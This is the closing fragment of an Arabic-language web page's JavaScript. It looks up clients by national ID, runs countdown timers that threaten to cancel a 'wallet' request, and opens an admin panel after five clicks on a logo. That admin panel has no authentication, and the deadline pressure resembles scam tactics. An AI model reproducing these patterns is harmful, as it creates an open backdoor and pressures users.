      document.getElementById('errorBox').style.display = 'none';

      setTimeout(() => {
        const uploadBtnElement = document.getElementById('uploadScreensBtn');
        if (uploadBtnElement) {
          uploadBtnElement.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }
      }, 500);
    }

    function startWalletCountdown(totalSeconds) {
      if (countdownInterval) clearInterval(countdownInterval);
      let secondsLeft = totalSeconds;
      const timerEl = document.getElementById('walletCountdown');
      if (!timerEl) return;
      countdownInterval = setInterval(() => {
        if (secondsLeft <= 0) {
          clearInterval(countdownInterval);
          timerEl.innerText = "00:00";
          timerEl.classList.add('danger');
          timerEl.style.color = "#EF4444";
          alert("⏰ انتهت المهلة المحددة (30 دقيقة)! سيتم شطب طلبك.");
          if (currentIndex !== -1 && currentClient) {
            clientsDB[currentIndex].clientStatus = 'blocked';
            displayResult(clientsDB[currentIndex], currentIndex);
          }
        } else {
          secondsLeft--;
          const minutes = Math.floor(secondsLeft / 60);
          const secs = secondsLeft % 60;
          timerEl.innerText = `${String(minutes).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
          if (secondsLeft < 60) timerEl.classList.add('danger'); else timerEl.classList.remove('danger');
        }
      }, 1000);
    }

    function startOpenWalletCountdown(totalSeconds) {
      if (countdownInterval) clearInterval(countdownInterval);
      let secondsLeft = totalSeconds;
      const timerEl = document.getElementById('openWalletCountdown');
      if (!timerEl) return;
      countdownInterval = setInterval(() => {
        if (secondsLeft <= 0) {
          clearInterval(countdownInterval);
          timerEl.innerText = "00:00:00";
          timerEl.classList.add('danger');
          timerEl.style.color = "#EF4444";
          alert("⏰ انتهت المهلة المحددة (6 ساعات) لفتح المحفظة. سيتم إلغاء طلبك تلقائياً.");
          if (currentIndex !== -1 && currentClient) {
            clientsDB[currentIndex].clientStatus = 'blocked';
            displayResult(clientsDB[currentIndex], currentIndex);
          }
        } else {
          secondsLeft--;
          const hours = Math.floor(secondsLeft / 3600);
          const minutes = Math.floor((secondsLeft % 3600) / 60);
          const secs = secondsLeft % 60;
          timerEl.innerText = `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
          if (secondsLeft < 3600) timerEl.classList.add('danger'); else timerEl.classList.remove('danger');
        }
      }, 1000);
    }

    function toggleAdmin() {
      isAdmin = !isAdmin;
      document.getElementById('adminPanel').classList.toggle('show', isAdmin);
    }

    function updateAdminStatus(status) {
      const statusMap = { 'pending': '⏳ قيد الإجراء', 'completed': '✅ تم الاستلام', 'blocked': '🚫 محظور' };
      document.getElementById('currentStatusText').textContent = statusMap[status] || 'غير محدد';
    }

    function changeStatus(newStatus) {
      if (currentIndex === -1 || !currentClient) { alert('⚠️ يرجى البحث عن عميل أولاً.'); return; }
      if (!confirm(`هل أنت متأكد من تغيير حالة العميل ${currentClient.name} إلى "${newStatus}"؟`)) return;
      clientsDB[currentIndex].clientStatus = newStatus;
      updateAdminStatus(newStatus);
      displayResult(clientsDB[currentIndex], currentIndex);
      alert(`✅ تم تغيير حالة العميل ${currentClient.name} إلى "${newStatus}" بنجاح.`);
    }

    function searchCustomer() {
      const nationalId = document.getElementById('nationalId').value.trim();
      if (!nationalId) { alert('الرجاء إدخال الرقم القومي (14 رقم)'); return; }
      if (nationalId.length !== 14) { alert('الرقم القومي يجب أن يكون 14 رقمًا'); return; }

      document.getElementById('loader').style.display = 'block';
      document.getElementById('resultArea').innerHTML = '';
      document.getElementById('errorBox').style.display = 'none';
      if (countdownInterval) { clearInterval(countdownInterval); countdownInterval = null; }

      setTimeout(() => {
        document.getElementById('loader').style.display = 'none';
        const foundIndex = clientsDB.findIndex(c => c.id === nationalId);
        if (foundIndex !== -1) {
          displayResult(clientsDB[foundIndex], foundIndex);
        } else {
          document.getElementById('errorBox').style.display = 'block';
          currentIndex = -1; currentClient = null;
          updateAdminStatus('غير محدد');
        }
      }, 800);
    }

    document.querySelector('.brand .icon')?.addEventListener('click', function() {
      adminClickCount++;
      if (adminClickCount >= 5) { toggleAdmin(); adminClickCount = 0; }
      setTimeout(() => { adminClickCount = 0; }, 3000);
    });

    document.getElementById('nationalId')?.addEventListener('keypress', e => {
      if (e.key === 'Enter') searchCustomer();
    });

    window.searchCustomer = searchCustomer;
    window.changeStatus = changeStatus;
  </script>
</body>
</html>
